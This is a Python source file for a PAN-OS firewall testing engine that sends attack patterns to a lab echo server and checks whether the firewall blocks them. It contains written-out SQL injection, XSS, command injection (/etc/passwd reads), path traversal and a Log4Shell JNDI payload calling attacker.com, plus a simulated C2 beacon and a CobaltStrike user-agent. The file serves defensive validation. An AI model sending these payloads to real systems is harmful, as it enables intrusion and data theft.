"""Security Testing Engine — validates PAN-OS NGFW security profiles.

Runs known attack patterns through the firewall and checks whether they are
blocked (PASS) or pass through (FAIL). Covers Vulnerability Protection,
Anti-Virus/Threat Prevention, and URL Filtering.
"""
import io
import json
import logging
import os
import socket
import ssl
import subprocess
import threading
import time
import zipfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('security')

# ─── Data Structures ────────────────────────────────────────

@dataclass
class SecurityTestCase:
    id: str
    name: str
    category: str           # web_attacks | malware_threats | url_filtering
    description: str
    expected_action: str    # "block"
    panos_feature: str      # PAN-OS feature that should catch this

@dataclass
class SecurityTestResult:
    test_id: str
    test_name: str
    category: str
    expected_action: str
    actual_result: str      # blocked | passed_through | error | pending
    verdict: str            # PASS | FAIL | ERROR
    response_code: int
    detail: str
    panos_feature: str
    timestamp: float = 0.0

# ─── Test Catalog ───────────────────────────────────────────

WEB_ATTACK_TESTS = [
    SecurityTestCase('sqli_union', 'SQL Injection — UNION SELECT',
        'web_attacks', 'UNION-based SQL injection in URL query parameter',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('sqli_or', 'SQL Injection — OR 1=1',
        'web_attacks', 'Boolean-based SQL injection via OR clause',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('sqli_drop', 'SQL Injection — DROP TABLE',
        'web_attacks', 'Destructive SQL injection with DROP TABLE statement',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_script', 'XSS — Script Tag',
        'web_attacks', 'Reflected XSS via <script> tag in URL parameter',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_img', 'XSS — IMG onerror',
        'web_attacks', 'Reflected XSS via IMG tag with onerror handler',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_svg', 'XSS — SVG onload',
        'web_attacks', 'Reflected XSS via SVG element with onload handler',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_cat', 'Command Injection — cat /etc/passwd',
        'web_attacks', 'OS command injection reading sensitive file',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_pipe', 'Command Injection — Pipe',
        'web_attacks', 'OS command injection using pipe operator',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_backtick', 'Command Injection — Backtick',
        'web_attacks', 'OS command injection via backtick execution',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('path_traversal', 'Path Traversal — ../../etc/passwd',
        'web_attacks', 'Directory traversal to read /etc/passwd',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
        'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header',
        'block', 'Vulnerability Protection'),
]

MALWARE_TESTS = [
    SecurityTestCase('eicar_http', 'EICAR Download — HTTP',
        'malware_threats', 'Download EICAR anti-malware test file over HTTP (port 9999)',
        'block', 'Anti-Virus'),
    SecurityTestCase('eicar_https', 'EICAR Download — HTTPS',
        'malware_threats', 'Download EICAR test file over HTTPS (requires SSL Decryption)',
        'block', 'Anti-Virus'),
    SecurityTestCase('eicar_zip', 'EICAR in ZIP — HTTP',
        'malware_threats', 'Download EICAR inside ZIP archive over HTTP',
        'block', 'Anti-Virus'),
    SecurityTestCase('c2_callback', 'C2 Callback Pattern',
        'malware_threats', 'HTTP POST with encoded data mimicking C2 beacon callback',
        'block', 'Anti-Spyware'),
    SecurityTestCase('malicious_ua', 'Malicious User-Agent',
        'malware_threats', 'HTTP request with known malware User-Agent string',
        'block', 'Anti-Spyware'),
]

URL_FILTERING_TESTS = [
    SecurityTestCase('url_malware', 'URL Category — Malware',
        'url_filtering', 'Access URL in PAN-DB malware category',
        'block', 'URL Filtering'),
    SecurityTestCase('url_phishing', 'URL Category — Phishing',
        'url_filtering', 'Access URL in PAN-DB phishing category',
        'block', 'URL Filtering'),
    SecurityTestCase('url_hacking', 'URL Category — Hacking',
        'url_filtering', 'Access URL in PAN-DB hacking category',
        'block', 'URL Filtering'),
    SecurityTestCase('url_proxy', 'URL Category — Proxy/Anonymizer',
        'url_filtering', 'Access URL in PAN-DB proxy-avoidance category',
        'block', 'URL Filtering'),
]

ALL_TESTS = WEB_ATTACK_TESTS + MALWARE_TESTS + URL_FILTERING_TESTS
TEST_MAP = {t.id: t for t in ALL_TESTS}

# Default URL Filtering test URLs (configurable at runtime)
DEFAULT_URL_MAP = {
    'url_malware': 'http://urlfiltering.paloaltonetworks.com/test-malware',
    'url_phishing': 'http://urlfiltering.paloaltonetworks.com/test-phishing',
    'url_hacking': 'http://urlfiltering.paloaltonetworks.com/test-hacking',
    'url_proxy': 'http://urlfiltering.paloaltonetworks.com/test-proxy-avoidance-and-anonymizers',
}

# PAN-OS block page markers (HTML response contains these when blocked)
BLOCK_PAGE_MARKERS = [
    'Palo Alto Networks',
    'block page',
    'URL Filtering',
    'Threat Prevention',
    'has been blocked',
    'Web Page Blocked',
    'Access to this website',
    'Security policy',
]

# ─── Attack Payloads ────────────────────────────────────────

ATTACK_PAYLOADS = {
    'sqli_union': "' UNION SELECT username,password FROM users--",
    'sqli_or': "' OR '1'='1' --",
    'sqli_drop': "'; DROP TABLE users;--",
    'xss_script': '<script>alert("XSS")</script>',
    'xss_img': '<img src=x onerror=alert("XSS")>',
    'xss_svg': '<svg onload=alert("XSS")>',
    'cmdi_cat': '; cat /etc/passwd',
    'cmdi_pipe': '| ls -la /',
    'cmdi_backtick': '`id`',
    'path_traversal': '../../../../etc/passwd',
    'log4shell': '${jndi:ldap://attacker.com/exploit}',
}

# ─── Security Test Engine ───────────────────────────────────

class SecurityTestEngine:
    def __init__(self):
        self._results: Dict[str, SecurityTestResult] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._logs: List[str] = []
        self._lock = threading.Lock()
        self._url_map = dict(DEFAULT_URL_MAP)

    def get_catalog(self) -> dict:
        """Return test catalog grouped by category."""
        groups = {}
        for t in ALL_TESTS:
            if t.category not in groups:
                groups[t.category] = []
            groups[t.category].append({
                'id': t.id, 'name': t.name, 'category': t.category,
                'description': t.description, 'expected_action': t.expected_action,
                'panos_feature': t.panos_feature,
            })
        return groups

    def start(self, test_ids: List[str], config: dict) -> tuple:
        """Start running selected tests. Returns (ok, message)."""
        if self._running:
            return False, 'Security tests already running'

        tests = [TEST_MAP[tid] for tid in test_ids if tid in TEST_MAP]
        if not tests:
            return False, 'No valid tests selected'

        # Update URL map if custom URLs provided
        custom_urls = config.get('url_map', {})
        self._url_map.update(custom_urls)

        host = config.get('host', os.environ.get('SERVER_HOST', 'server'))
        http_port = int(config.get('http_port', 9999))
        https_port = int(config.get('https_port', 443))
        interval = float(config.get('interval', 2))

        # Mark selected tests as pending
        with self._lock:
            for t in tests:
                self._results[t.id] = SecurityTestResult(
                    test_id=t.id, test_name=t.name, category=t.category,
                    expected_action=t.expected_action, actual_result='pending',
                    verdict='PENDING', response_code=0, detail='Queued',
                    panos_feature=t.panos_feature, timestamp=time.time())

        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._run_tests, args=(tests, host, http_port, https_port, interval),
            daemon=True)
        self._thread.start()
        self._add_log(f'Started {len(tests)} security tests against {host}')
        return True, f'Running {len(tests)} tests'

    def stop(self) -> tuple:
        if not self._running:
            return False, 'Not running'
        self._stop_event.set()
        self._running = False
        self._add_log('Security tests stopped')
        return True, 'Stopped'

    def clear(self):
        with self._lock:
            self._results.clear()
            self._logs.clear()

    def get_status(self) -> dict:
        with self._lock:
            results = []
            for r in self._results.values():
                results.append({
                    'test_id': r.test_id, 'test_name': r.test_name,
                    'category': r.category, 'expected_action': r.expected_action,
                    'actual_result': r.actual_result, 'verdict': r.verdict,
                    'response_code': r.response_code, 'detail': r.detail,
                    'panos_feature': r.panos_feature, 'timestamp': r.timestamp,
                })
            total = len(results)
            passed = sum(1 for r in results if r['verdict'] == 'PASS')
            failed = sum(1 for r in results if r['verdict'] == 'FAIL')
            errors = sum(1 for r in results if r['verdict'] == 'ERROR')
            pending = sum(1 for r in results if r['verdict'] == 'PENDING')
        return {
            'running': self._running,
            'results': results,
            'logs': list(self._logs[-100:]),
            'summary': {'total': total, 'passed': passed, 'failed': failed,
                        'errors': errors, 'pending': pending},
        }

    def _add_log(self, msg: str):
        with self._lock:
            ts = time.strftime('%H:%M:%S')
            self._logs.append(f'[{ts}] {msg}')
            if len(self._logs) > 500:
                self._logs = self._logs[-250:]
        log.info(msg)

    def _run_tests(self, tests, host, http_port, https_port, interval):
        """Execute tests sequentially."""
        for test in tests:
            if self._stop_event.is_set():
                break
            self._add_log(f'Running: {test.name}')
            try:
                result = self._execute_test(test, host, http_port, https_port)
                with self._lock:
                    self._results[test.id] = result
                verdict_msg = f'{test.name} → {result.verdict}'
                if result.verdict == 'PASS':
                    verdict_msg += ' (blocked by firewall)'
                elif result.verdict == 'FAIL':
                    verdict_msg += ' (passed through — not blocked)'
                self._add_log(verdict_msg)
            except Exception as e:
                with self._lock:
                    self._results[test.id] = SecurityTestResult(
                        test_id=test.id, test_name=test.name, category=test.category,
                        expected_action=test.expected_action, actual_result='error',
                        verdict='ERROR', response_code=0, detail=str(e),
                        panos_feature=test.panos_feature, timestamp=time.time())
                self._add_log(f'{test.name} → ERROR: {e}')

            if not self._stop_event.is_set():
                time.sleep(interval)

        self._running = False
        self._add_log('Security test run complete')

    def _execute_test(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Run a single test and determine verdict."""
        if test.category == 'web_attacks':
            return self._test_web_attack(test, host, http_port)
        elif test.category == 'malware_threats':
            return self._test_malware(test, host, http_port, https_port)
        elif test.category == 'url_filtering':
            return self._test_url_filtering(test)
        else:
            return SecurityTestResult(
                test_id=test.id, test_name=test.name, category=test.category,
                expected_action=test.expected_action, actual_result='error',
                verdict='ERROR', response_code=0, detail=f'Unknown category: {test.category}',
                panos_feature=test.panos_feature, timestamp=time.time())

    def _test_web_attack(self, test: SecurityTestCase, host: str,
                         port: int) -> SecurityTestResult:
        """Send attack payload to echo server and check if blocked."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{port}/echo'

        if test.id == 'log4shell':
            # Log4Shell: payload goes in HTTP header
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'X-Api-Version': payload, 'User-Agent': payload},
                    timeout=10)
                return self._analyze_response(test, resp, payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))
        elif test.id == 'path_traversal':
            # Path traversal: payload in URL path
            try:
                trav_url = f'http://{host}:{port}/{payload}'
                resp = requests.get(trav_url, timeout=10)
                return self._analyze_response(test, resp, payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))
        else:
            # GET with payload in query param
            try:
                resp = requests.get(url, params={'payload': payload}, timeout=10)
                return self._analyze_response(test, resp, payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

    def _test_malware(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Test malware/threat detection."""
        if test.id == 'eicar_http':
            url = f'http://{host}:{http_port}/eicar'
            try:
                resp = requests.get(url, timeout=10)
                # If we get EICAR back intact, firewall didn't block it
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR test file downloaded successfully — not blocked')
                return self._analyze_response(test, resp, 'EICAR')
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

        elif test.id == 'eicar_https':
            url = f'https://{host}:{https_port}/eicar'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — not blocked (SSL Decryption may not be enabled)')
                return self._analyze_response(test, resp, 'EICAR')
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

        elif test.id == 'eicar_zip':
            url = f'http://{host}:{http_port}/eicar.zip'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and len(resp.content) > 0:
                    # Try to verify it's a valid zip with EICAR inside
                    try:
                        with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
                            if 'eicar.com' in zf.namelist():
                                return self._passthrough_result(test, resp.status_code,
                                    'EICAR ZIP downloaded — not blocked')
                    except zipfile.BadZipFile:
                        pass
                return self._analyze_response(test, resp, 'EICAR')
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

        elif test.id == 'c2_callback':
            url = f'http://{host}:{http_port}/echo'
            # Simulate C2 beacon: encoded payload with suspicious headers
            c2_data = 'aWQgLWE7dW5hbWUgLWE7aWZjb25maWc='  # base64 of common recon
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
                    }, timeout=10)
                return self._analyze_response(test, resp, c2_data)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

        elif test.id == 'malicious_ua':
            url = f'http://{host}:{http_port}/echo?payload=test'
            try:
                resp = requests.get(url,
                    headers={'User-Agent': 'Wget/1.0 (CobaltStrike)'},
                    timeout=10)
                return self._analyze_response(test, resp, 'CobaltStrike')
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e))

        return self._error_result(test, f'Unknown malware test: {test.id}')

    def _test_url_filtering(self, test: SecurityTestCase) -> SecurityTestResult:
        """Test URL filtering by accessing categorized URLs."""
        url = self._url_map.get(test.id, '')
        if not url:
            return self._error_result(test, 'No URL configured for this test')
        try:
            resp = requests.get(url, timeout=10, verify=False,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            # Check for block page
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected', resp.status_code)
            # If we got through with 200, it's not blocked
            if resp.status_code == 200:
                return self._passthrough_result(test, resp.status_code,
                    f'URL accessible — not blocked by URL Filtering')
            # 403 from the firewall vs the server
            if resp.status_code in (403, 406, 503):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — likely blocked', resp.status_code)
            return self._passthrough_result(test, resp.status_code,
                f'HTTP {resp.status_code} — unclear if blocked')
        except (requests.ConnectionError, requests.Timeout) as e:
            return self._blocked_result(test, f'Connection blocked: {e}')

    # ─── Response Analysis ──────────────────────────────────

    def _analyze_response(self, test: SecurityTestCase, resp,
                          payload_marker: str) -> SecurityTestResult:
        """Determine if a response indicates the attack was blocked or passed through."""
        # Check for block page
        if self._is_block_page(resp):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — Block page detected', resp.status_code)

        # TCP RST / connection reset would have raised ConnectionError (caught above)
        # HTTP 403/406/503 from firewall
        if resp.status_code in (403, 406, 503):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — blocked by firewall', resp.status_code)

        # HTTP 200 with echoed payload = passed through
        if resp.status_code == 200:
            body = resp.text
            # Check if the payload or a recognizable part was echoed back
            if payload_marker and payload_marker in body:
                return self._passthrough_result(test, resp.status_code,
                    'Payload echoed back — attack passed through firewall')
            # Even without exact echo, 200 from echo server = passed through
            if '/echo' in (resp.url or '') or 'Echo Response' in body:
                return self._passthrough_result(test, resp.status_code,
                    'Echo server responded — attack passed through')

        # Other status codes — assume passed through
        return self._passthrough_result(test, resp.status_code,
            f'HTTP {resp.status_code} — not blocked')

    def _is_block_page(self, resp) -> bool:
        """Check if response contains a PAN-OS block page."""
        text = resp.text.lower() if resp.text else ''
        for marker in BLOCK_PAGE_MARKERS:
            if marker.lower() in text:
                return True
        return False

    def _blocked_result(self, test, detail, status_code=0):
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='blocked',
            verdict='PASS', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time())

    def _passthrough_result(self, test, status_code, detail):
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='passed_through',
            verdict='FAIL', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time())

    def _error_result(self, test, detail):
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='error',
            verdict='ERROR', response_code=0, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time())
